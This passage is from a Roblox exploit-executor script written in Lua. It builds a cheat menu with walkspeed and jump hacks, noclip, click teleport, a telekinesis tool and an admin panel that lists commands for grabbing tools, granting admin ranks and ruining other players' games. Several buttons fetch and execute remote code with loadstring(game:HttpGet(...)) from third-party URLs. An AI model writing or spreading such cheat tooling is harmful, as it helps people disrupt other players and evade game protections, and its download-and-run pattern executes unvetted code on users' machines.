				RW.C1=clerp(LW.C1,cf(0,0.5,0)*euler(0,0,0),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(0.3,0,-0.2),.3)
				LW.C1=clerp(LW.C1,cf(0,0.5,0)*euler(0,0,0),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,0)*euler(0.4,1.57,0),.2)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*euler(-0.2,-1.57,0),.2)
			end
		elseif torvel<1 and hitfloor~=nil then
			Anim="Idle"
			if attack==false then
				--[[]]
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,-.2)*angles(math.rad(15),math.rad(0),math.rad(10)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-15),math.rad(0),math.rad(-15)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(90),math.rad(75),math.rad(-5)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(90),math.rad(-75),math.rad(5)),.3)
				RH.C0=clerp(RH.C0,cf(1,-.7,-.25)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-5),math.rad(-15),math.rad(15)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(-15),math.rad(0)),.3)
			end
		elseif torvel>2 and torvel<22 and hitfloor~=nil then
			Anim="Walk"
			if attack==false then
				change=3
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(15),math.rad(0),math.rad(0)),.2)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-15),math.rad(0),math.rad(0)),.2)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-35),math.rad(0),math.rad(0)),.2)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-35),math.rad(0),math.rad(0)),.2)
				RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(0),math.rad(0),math.rad(0)),.2)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(0),math.rad(0),math.rad(0)),.2)
			end
		elseif torvel>=22 and hitfloor~=nil then
			Anim="Run"
			if attack==false then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(45),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-40),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(-60),math.rad(0),math.rad(0)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-60),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
			end
		end
	end
end end
}

local Tab = GUI:Tab{
	Name = "LocalPlayer",
	Icon = "rbxassetid://12049193959"
}

Tab:Slider{
	Name = "Walkspeed",
	Default = 20,
	Min = 0,
	Max = 500,
	Callback = function(s) game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s end
}

Tab:Slider{
	Name = "Jumppower",
	Default = 50,
	Min = 0,
	Max = 500,
	Callback = function(s) game.Players.LocalPlayer.Character.Humanoid.JumpPower = s end
}

Tab:Button{
	Name = "Dex V2",
	Description = nil,
	Callback = function() loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))() end
}

Tab:Button{
	Name = "Noclip",
	Description = nil,
	Callback = function() noclip = false
game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
 
if key == "e" then
noclip = not noclip
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end) end
}

Tab:Button{
	Name = "Click teleport",
	Description = nil,
	Callback = function() mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "TP"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end)
tool.Parent = game.Players.LocalPlayer.Backpack end
}

Tab:Button{
	Name = "FE Gravity tool",
	Description = nil,
	Callback = function() -- Q & E - bring closer and further
-- R - Roates Block
-- T - Tilts Block
-- Y - Throws Block
local function a(b, c)
    local d = getfenv(c)
    local e =
        setmetatable(
        {},
        {__index = function(self, f)
                if f == "script" then
                    return b
                else
                    return d[f]
                end
            end}
    )
    setfenv(c, e)
    return c
end
local g = {}
local h = Instance.new("Model", game:GetService("Lighting"))
local i = Instance.new("Tool")
local j = Instance.new("Part")
local k = Instance.new("Script")
local l = Instance.new("LocalScript")
local m = sethiddenproperty or set_hidden_property
i.Name = "Telekinesis"
i.Parent = h
i.Grip = CFrame.new(0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0)
i.GripForward = Vector3.new(-0, -1, -0)
i.GripRight = Vector3.new(0, 0, 1)
i.GripUp = Vector3.new(1, 0, 0)
j.Name = "Handle"
j.Parent = i
j.CFrame = CFrame.new(-17.2635937, 15.4915619, 46, 0, 1, 0, 1, 0, 0, 0, 0, -1)
j.Orientation = Vector3.new(0, 180, 90)
j.Position = Vector3.new(-17.2635937, 15.4915619, 46)
j.Rotation = Vector3.new(-180, 0, -90)
j.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
j.Transparency = 1
j.Size = Vector3.new(1, 1.20000005, 1)
j.BottomSurface = Enum.SurfaceType.Weld
j.BrickColor = BrickColor.new("Really black")
j.Material = Enum.Material.Metal
j.TopSurface = Enum.SurfaceType.Smooth
j.brickColor = BrickColor.new("Really black")
k.Name = "LineConnect"
k.Parent = i
table.insert(
    g,
    a(
        k,
        function()
            wait()
            local n = script.Part2
            local o = script.Part1.Value
            local p = script.Part2.Value
            local q = script.Par.Value
            local color = script.Color
            local r = Instance.new("Part")
            r.TopSurface = 0
            r.BottomSurface = 0
            r.Reflectance = .5
            r.Name = "Laser"
            r.Locked = true
            r.CanCollide = false
            r.Anchored = true
            r.formFactor = 0
            r.Size = Vector3.new(1, 1, 1)
            local s = Instance.new("BlockMesh")
            s.Parent = r
            while true do
                if n.Value == nil then
                    break
                end
                if o == nil or p == nil or q == nil then
                    break
                end
                if o.Parent == nil or p.Parent == nil then
                    break
                end
                if q.Parent == nil then
                    break
                end
                local t = CFrame.new(o.Position, p.Position)
                local dist = (o.Position - p.Position).magnitude
                r.Parent = q
                r.BrickColor = color.Value.BrickColor
                r.Reflectance = color.Value.Reflectance
                r.Transparency = color.Value.Transparency
                r.CFrame = CFrame.new(o.Position + t.lookVector * dist / 2)
                r.CFrame = CFrame.new(r.Position, p.Position)
                s.Scale = Vector3.new(.25, .25, dist)
                wait()
            end
            r:remove()
            script:remove()
        end
    )
)
k.Disabled = true
l.Name = "MainScript"
l.Parent = i
table.insert(
    g,
    a(
        l,
        function()
            wait()
            tool = script.Parent
            lineconnect = tool.LineConnect
            object = nil
            mousedown = false
            found = false
            BP = Instance.new("BodyPosition")
            BP.maxForce = Vector3.new(math.huge * math.huge, math.huge * math.huge, math.huge * math.huge)
            BP.P = BP.P * 1.1
            dist = nil
            point = Instance.new("Part")
            point.Locked = true
            point.Anchored = true
            point.formFactor = 0
            point.Shape = 0
            point.BrickColor = BrickColor.Black()
            point.Size = Vector3.new(1, 1, 1)
            point.CanCollide = false
            local s = Instance.new("SpecialMesh")
            s.MeshType = "Sphere"
            s.Scale = Vector3.new(.7, .7, .7)
            s.Parent = point
            handle = tool.Handle
            front = tool.Handle
            color = tool.Handle
            objval = nil
            local u = false
            local v = BP:clone()
            v.maxForce = Vector3.new(30000, 30000, 30000)
            function LineConnect(o, p, q)
                local w = Instance.new("ObjectValue")
                w.Value = o
                w.Name = "Part1"
                local x = Instance.new("ObjectValue")
                x.Value = p
                x.Name = "Part2"
                local y = Instance.new("ObjectValue")
                y.Value = q
                y.Name = "Par"
                local z = Instance.new("ObjectValue")
                z.Value = color
                z.Name = "Color"
                local A = lineconnect:clone()
                A.Disabled = false
                w.Parent = A
                x.Parent = A
                y.Parent = A
                z.Parent = A
                A.Parent = workspace
                if p == object then
                    objval = x
                end
            end
            function onButton1Down(B)
                if mousedown == true then
                    return
                end
                mousedown = true
                coroutine.resume(
                    coroutine.create(
                        function()
                            local C = point:clone()
                            C.Parent = tool
                            LineConnect(front, C, workspace)
                            while mousedown == true do
                                C.Parent = tool
                                if object == nil then
                                    if B.Target == nil then
                                        local t = CFrame.new(front.Position, B.Hit.p)
                                        C.CFrame = CFrame.new(front.Position + t.lookVector * 1000)
                                    else
                                        C.CFrame = CFrame.new(B.Hit.p)
                                    end
                                else
                                    LineConnect(front, object, workspace)
                                    break
                                end
                                wait()
                            end
                            C:remove()
                        end
                    )
                )
                while mousedown == true do
                    if B.Target ~= nil then
                        local D = B.Target
                        if D.Anchored == false then
                            object = D
                            dist = (object.Position - front.Position).magnitude
                            break
                        end
                    end
                    wait()
                end
                while mousedown == true do
                    if object.Parent == nil then
                        break
                    end
                    local t = CFrame.new(front.Position, B.Hit.p)
                    BP.Parent = object
                    BP.position = front.Position + t.lookVector * dist
                    wait()
                end
                BP:remove()
                object = nil
                objval.Value = nil
            end
            function onKeyDown(E, B)
                local E = E:lower()
                local F = false
                if E == "q" then
                    if dist >= 5 then
                        dist = dist - 10
                    end
                end
                if E == "r" then
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == "BodyGyro" then
                            return nil
                        end
                    end
                    BG = Instance.new("BodyGyro")
                    BG.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
                    BG.cframe = CFrame.new(object.CFrame.p)
                    BG.Parent = object
                    repeat
                        wait()
                    until object.CFrame == CFrame.new(object.CFrame.p)
                    BG.Parent = nil
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == "BodyGyro" then
                            H.Parent = nil
                        end
                    end
                    object.Velocity = Vector3.new(0, 0, 0)
                    object.RotVelocity = Vector3.new(0, 0, 0)
                    object.Orientation = Vector3.new(0, 0, 0)
                end
                if E == "e" then
                    dist = dist + 10
                end
                if E == "t" then
                    if dist ~= 10 then
                        dist = 10
                    end
                end
                if E == "y" then
                    if dist ~= 200 then
                        dist = 200
                    end
                end
                if E == "=" then
                    BP.P = BP.P * 1.5
                end
                if E == "-" then
                    BP.P = BP.P * 0.5
                end
            end
            function onEquipped(B)
                keymouse = B
                local I = tool.Parent
                human = I.Humanoid
                human.Changed:connect(
                    function()
                        if human.Health == 0 then
                            mousedown = false
                            BP:remove()
                            point:remove()
                            tool:remove()
                        end
                    end
                )
                B.Button1Down:connect(
                    function()
                        onButton1Down(B)
                    end
                )
                B.Button1Up:connect(
                    function()
                        mousedown = false
                    end
                )
                B.KeyDown:connect(
                    function(E)
                        onKeyDown(E, B)
                    end
                )
                B.Icon = "rbxasset://textures\\GunCursor.png"
            end
            tool.Equipped:connect(onEquipped)
        end
    )
)
for J, H in pairs(h:GetChildren()) do
    H.Parent = game:GetService("Players").LocalPlayer.Backpack
    pcall(
        function()
            H:MakeJoints()
        end
    )
end
h:Destroy()
for J, H in pairs(g) do
    spawn(
        function()
            pcall(H)
        end
    )
end
 end
}

Tab:Button{
	Name = "Infinite Jump",
	Description = nil,
	Callback = function() loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Jump.txt"))() end
}

local Tab = GUI:Tab{
	Name = "Admins",
	Icon = "rbxassetid://17431238718"
}

Tab:Button{
	Name = "Infinite Yield",
	Description = nil,
	Callback = function() loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))() end
}

Tab:Button{
	Name = "CMD (Beta)",
	Description = nil,
	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/lxte/cmd/main/testing-main.lua"))() end
}

Tab:Button{
	Name = "Loaf Admin",
	Description = nil,
	Callback = function() 
local LPLR =  game:GetService('Players').LocalPlayer
local CMDS = {}
local SEIZURE = false
--Frame gui thing.
local FEAdmin = Instance.new("ScreenGui")
local Cmdbar = Instance.new("Frame")
local Bar = Instance.new("TextBox")
local CommandEffect = Instance.new("TextLabel")
local ListTemplate = Instance.new("Frame")
local Exit = Instance.new("TextButton")
local Name = Instance.new("TextLabel")
local BodyFrame = Instance.new("Frame")
local Data = Instance.new("ScrollingFrame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local TemplateLabel = Instance.new("TextLabel")
local TemplateLabel_2 = Instance.new("TextLabel")
local TemplateLabel_3 = Instance.new("TextLabel")
local TemplateLabel_4 = Instance.new("TextLabel")
local TemplateLabel_5 = Instance.new("TextLabel")
local TemplateLabel_6 = Instance.new("TextLabel")
local TemplateLabel_7 = Instance.new("TextLabel")
local TemplateLabel_8 = Instance.new("TextLabel")
local TemplateLabel_9 = Instance.new("TextLabel")
local TemplateLabel_10 = Instance.new("TextLabel")
local TemplateLabel_11 = Instance.new("TextLabel")
local TemplateLabel_12 = Instance.new("TextLabel")
local TemplateLabel_13 = Instance.new("TextLabel")
local TemplateLabel_14 = Instance.new("TextLabel")
local TemplateLabel_15 = Instance.new("TextLabel")
local TemplateLabel_16 = Instance.new("TextLabel")
local TemplateLabel_17 = Instance.new("TextLabel")
local TemplateLabel_18 = Instance.new("TextLabel")
local TemplateLabel_19 = Instance.new("TextLabel")
local PlayerInfoB = Instance.new("ImageButton")
local TextButton = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")

--Properties:

FEAdmin.Name = "FEAdmin"
FEAdmin.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
FEAdmin.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
FEAdmin.DisplayOrder = 999
FEAdmin.ResetOnSpawn = false

Cmdbar.Name = "Cmdbar"
Cmdbar.Parent = FEAdmin
Cmdbar.Active = true
Cmdbar.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
Cmdbar.BackgroundTransparency = 1.000
Cmdbar.BorderColor3 = Color3.fromRGB(27, 42, 53)
Cmdbar.BorderSizePixel = 0
Cmdbar.Position = UDim2.new(-0.000399515033, 0, 0.0713877082, 0)
Cmdbar.Size = UDim2.new(0, 731, 0, 31)

Bar.Name = "Bar"
Bar.Parent = Cmdbar
Bar.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
Bar.BackgroundTransparency = 0.310
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.0229999833, 0, -1.84686923, 0)
Bar.Size = UDim2.new(200.153, 0, 1.84686661, 0)
Bar.Visible = false
Bar.Font = Enum.Font.SourceSansLight
Bar.PlaceholderColor3 = Color3.fromRGB(35, 35, 35)
Bar.Text = ""
Bar.TextColor3 = Color3.fromRGB(255, 255, 255)
Bar.TextScaled = true
Bar.TextSize = 14.000
Bar.TextWrapped = true
Bar.TextXAlignment = Enum.TextXAlignment.Left

CommandEffect.Name = "CommandEffect"
CommandEffect.Parent = Bar
CommandEffect.Active = true
CommandEffect.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
CommandEffect.BackgroundTransparency = 0.310
CommandEffect.BorderSizePixel = 0
CommandEffect.Position = UDim2.new(-0.025754232, 0, 0, 0)
CommandEffect.Size = UDim2.new(0.025754232, 0, 1, 0)
CommandEffect.Font = Enum.Font.SourceSansSemibold
CommandEffect.Text = ":"
CommandEffect.TextColor3 = Color3.fromRGB(255, 255, 255)
CommandEffect.TextScaled = true
CommandEffect.TextSize = 14.000
CommandEffect.TextStrokeTransparency = 0.800
CommandEffect.TextWrapped = true
CommandEffect.TextXAlignment = Enum.TextXAlignment.Right

ListTemplate.Name = "ListTemplate"
ListTemplate.Parent = FEAdmin
ListTemplate.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
ListTemplate.BackgroundTransparency = 0.400
ListTemplate.BorderSizePixel = 0
ListTemplate.Position = UDim2.new(0.496451378, -343, 0.290523708, -171)
ListTemplate.Selectable = true
ListTemplate.Size = UDim2.new(0, 696, 0, 26)

Exit.Name = "Exit"
Exit.Parent = ListTemplate
Exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exit.BackgroundTransparency = 1.000
Exit.Position = UDim2.new(0.943965495, 0, 0.0384615399, 0)
Exit.Size = UDim2.new(0, 34, 0, 25)
Exit.Font = Enum.Font.SourceSansLight
Exit.Text = "X"
Exit.TextColor3 = Color3.fromRGB(236, 236, 236)
Exit.TextScaled = true
Exit.TextSize = 14.000
Exit.TextWrapped = true

Name.Name = "Name"
Name.Parent = ListTemplate
Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Name.BackgroundTransparency = 1.000
Name.Position = UDim2.new(0.293103456, 0, 0, 0)
Name.Size = UDim2.new(0.413793117, 0, 1, 0)
Name.Font = Enum.Font.SourceSansSemibold
Name.Text = "Loaf's Commands"
Name.TextColor3 = Color3.fromRGB(245, 245, 245)
Name.TextScaled = true
Name.TextSize = 14.000
Name.TextStrokeTransparency = 0.900
Name.TextWrapped = true

BodyFrame.Name = "BodyFrame"
BodyFrame.Parent = ListTemplate
BodyFrame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
BodyFrame.BackgroundTransparency = 0.400
BodyFrame.BorderSizePixel = 0
BodyFrame.Position = UDim2.new(0, 0, 1, 0)
BodyFrame.Selectable = true
BodyFrame.Size = UDim2.new(0, 696, 0, 432)

Data.Name = "Data"
Data.Parent = BodyFrame
Data.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Data.BackgroundTransparency = 0.400
Data.BorderSizePixel = 0
Data.Position = UDim2.new(0.00574712688, 0, 0.011661808, 0)
Data.Size = UDim2.new(0.987068951, 0, 0.976676404, 0)
Data.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Data.CanvasSize = UDim2.new(0, 0, 0, 0)
Data.ScrollBarThickness = 10
Data.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"

ScrollingFrame.Parent = BodyFrame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.Position = UDim2.new(0.00574712642, 0, 0, 0)
ScrollingFrame.Size = UDim2.new(0, 687, 0, 426)
ScrollingFrame.ScrollBarThickness = 0

UIListLayout.Parent = ScrollingFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

TemplateLabel.Name = "TemplateLabel"
TemplateLabel.Parent = ScrollingFrame
TemplateLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel.BackgroundTransparency = 1.000
TemplateLabel.Selectable = true
TemplateLabel.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel.Font = Enum.Font.SourceSansLight
TemplateLabel.Text = "Cmds - shows all the Commands"
TemplateLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel.TextScaled = true
TemplateLabel.TextSize = 14.000
TemplateLabel.TextWrapped = true

TemplateLabel_2.Name = "TemplateLabel"
TemplateLabel_2.Parent = ScrollingFrame
TemplateLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_2.BackgroundTransparency = 1.000
TemplateLabel_2.Selectable = true
TemplateLabel_2.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_2.Font = Enum.Font.SourceSansLight
TemplateLabel_2.Text = "Getalltools - gets all tools in game"
TemplateLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_2.TextScaled = true
TemplateLabel_2.TextSize = 14.000
TemplateLabel_2.TextWrapped = true



TemplateLabel_3.Name = "TemplateLabel"
TemplateLabel_3.Parent = ScrollingFrame
TemplateLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_3.BackgroundTransparency = 1.000
TemplateLabel_3.Selectable = true
TemplateLabel_3.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_3.Font = Enum.Font.SourceSansLight
TemplateLabel_3.Text = "GrabknifeV4 - gives you grabknife (FE)"
TemplateLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_3.TextScaled = true
TemplateLabel_3.TextSize = 14.000
TemplateLabel_3.TextWrapped = true

TemplateLabel_4.Name = "TemplateLabel"
TemplateLabel_4.Parent = ScrollingFrame
TemplateLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_4.BackgroundTransparency = 1.000
TemplateLabel_4.Selectable = true
TemplateLabel_4.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_4.Font = Enum.Font.SourceSansLight
TemplateLabel_4.Text = "Harked - gives harked gui"
TemplateLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_4.TextScaled = true
TemplateLabel_4.TextSize = 14.000
TemplateLabel_4.TextWrapped = true

TemplateLabel_5.Name = "TemplateLabel"
TemplateLabel_5.Parent = ScrollingFrame
TemplateLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_5.BackgroundTransparency = 1.000
TemplateLabel_5.Selectable = true
TemplateLabel_5.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_5.Font = Enum.Font.SourceSansLight
TemplateLabel_5.Text = "CartRideGui - gives a cart ride ruiner gui. (RARE)"
TemplateLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_5.TextScaled = true
TemplateLabel_5.TextSize = 14.000
TemplateLabel_5.TextWrapped = true

TemplateLabel_6.Name = "TemplateLabel"
TemplateLabel_6.Parent = ScrollingFrame
TemplateLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_6.BackgroundTransparency = 1.000
TemplateLabel_6.Selectable = true
TemplateLabel_6.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_6.Font = Enum.Font.SourceSansLight
TemplateLabel_6.Text = "InsertHD - inserts hd admin in game."
TemplateLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_6.TextScaled = true
TemplateLabel_6.TextSize = 14.000
TemplateLabel_6.TextWrapped = true

TemplateLabel_7.Name = "TemplateLabel"
TemplateLabel_7.Parent = ScrollingFrame
TemplateLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_7.BackgroundTransparency = 1.000
TemplateLabel_7.Selectable = true
TemplateLabel_7.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_7.Font = Enum.Font.SourceSansLight
TemplateLabel_7.Text = "RankHD - gives a rank in hd admin."
TemplateLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_7.TextScaled = true
TemplateLabel_7.TextSize = 14.000
TemplateLabel_7.TextWrapped = true

TemplateLabel_8.Name = "TemplateLabel"
TemplateLabel_8.Parent = ScrollingFrame
TemplateLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_8.BackgroundTransparency = 1.000
TemplateLabel_8.Selectable = true
TemplateLabel_8.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_8.Font = Enum.Font.SourceSansLight
TemplateLabel_8.Text = "SSP - gives secret service panel."
TemplateLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_8.TextScaled = true
TemplateLabel_8.TextSize = 14.000
TemplateLabel_8.TextWrapped = true

TemplateLabel_9.Name = "TemplateLabel"
TemplateLabel_9.Parent = ScrollingFrame
TemplateLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_9.BackgroundTransparency = 1.000
TemplateLabel_9.Selectable = true
TemplateLabel_9.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_9.Font = Enum.Font.SourceSansLight
TemplateLabel_9.Text = "Stigma - gives ICON at the bottom of stigma."
TemplateLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_9.TextScaled = true
TemplateLabel_9.TextSize = 14.000
TemplateLabel_9.TextWrapped = true

TemplateLabel_10.Name = "TemplateLabel"
TemplateLabel_10.Parent = ScrollingFrame
TemplateLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_10.BackgroundTransparency = 1.000
TemplateLabel_10.Selectable = true
TemplateLabel_10.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_10.Font = Enum.Font.SourceSansLight
TemplateLabel_10.Text = "Sword - gives weapon in alot of games!"
TemplateLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_10.TextScaled = true
TemplateLabel_10.TextSize = 14.000
TemplateLabel_10.TextWrapped = true

TemplateLabel_11.Name = "TemplateLabel"
TemplateLabel_11.Parent = ScrollingFrame
TemplateLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_11.BackgroundTransparency = 1.000
TemplateLabel_11.Selectable = true
TemplateLabel_11.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_11.Font = Enum.Font.SourceSansLight
TemplateLabel_11.Text = "CrossTool - gives a large cross tool."
TemplateLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_11.TextScaled = true
TemplateLabel_11.TextSize = 14.000
TemplateLabel_11.TextWrapped = true

TemplateLabel_12.Name = "TemplateLabel"
TemplateLabel_12.Parent = ScrollingFrame
TemplateLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_12.BackgroundTransparency = 1.000
TemplateLabel_12.Selectable = true
TemplateLabel_12.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_12.Font = Enum.Font.SourceSansLight
TemplateLabel_12.Text = "Flinggui - gives a fling gui (UNLEAKED) (OP)"
TemplateLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_12.TextScaled = true
TemplateLabel_12.TextSize = 14.000
TemplateLabel_12.TextWrapped = true

TemplateLabel_13.Name = "TemplateLabel"
TemplateLabel_13.Parent = ScrollingFrame
TemplateLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_13.BackgroundTransparency = 1.000
TemplateLabel_13.Selectable = true
TemplateLabel_13.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_13.Font = Enum.Font.SourceSansLight
TemplateLabel_13.Text = "R6 - makes you R6 (FE)"
TemplateLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_13.TextScaled = true
TemplateLabel_13.TextSize = 14.000
TemplateLabel_13.TextWrapped = true

TemplateLabel_14.Name = "TemplateLabel"
TemplateLabel_14.Parent = ScrollingFrame
TemplateLabel_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_14.BackgroundTransparency = 1.000
TemplateLabel_14.Selectable = true
TemplateLabel_14.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_14.Font = Enum.Font.SourceSansLight
TemplateLabel_14.Text = "Thomas - makes your character thomas the train. (FE)"
TemplateLabel_14.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_14.TextScaled = true
TemplateLabel_14.TextSize = 14.000
TemplateLabel_14.TextWrapped = true

TemplateLabel_15.Name = "TemplateLabel"
TemplateLabel_15.Parent = ScrollingFrame
TemplateLabel_15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_15.BackgroundTransparency = 1.000
TemplateLabel_15.Selectable = true
TemplateLabel_15.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_15.Font = Enum.Font.SourceSansLight
TemplateLabel_15.Text = "BreadGui - inserts bread gui for daycare games."
TemplateLabel_15.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_15.TextScaled = true
TemplateLabel_15.TextSize = 14.000
TemplateLabel_15.TextWrapped = true

TemplateLabel_16.Name = "TemplateLabel"
TemplateLabel_16.Parent = ScrollingFrame
TemplateLabel_16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_16.BackgroundTransparency = 1.000
TemplateLabel_16.Position = UDim2.new(0.120815136, 0, 0.0289351847, 0)
TemplateLabel_16.Selectable = true
TemplateLabel_16.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_16.Font = Enum.Font.SourceSansLight
TemplateLabel_16.Text = "LuaHammer - gives you a lua hammer."
TemplateLabel_16.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_16.TextScaled = true
TemplateLabel_16.TextSize = 14.000
TemplateLabel_16.TextWrapped = true

TemplateLabel_17.Name = "TemplateLabel"
TemplateLabel_17.Parent = ScrollingFrame
TemplateLabel_17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_17.BackgroundTransparency = 1.000
TemplateLabel_17.Selectable = true
TemplateLabel_17.Size = UDim2.new(1, 0, 0, 25)
TemplateLabel_17.Font = Enum.Font.SourceSansLight
TemplateLabel_17.Text = "Hammer - gives you a hammer tool (RARE)"
TemplateLabel_17.TextColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_17.TextScaled = true
TemplateLabel_17.TextSize = 14.000
TemplateLabel_17.TextWrapped = true

TemplateLabel_18.Name = "TemplateLabel"
TemplateLabel_18.Parent = ScrollingFrame
TemplateLabel_18.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TemplateLabel_18.BackgroundTransparency = 1.000
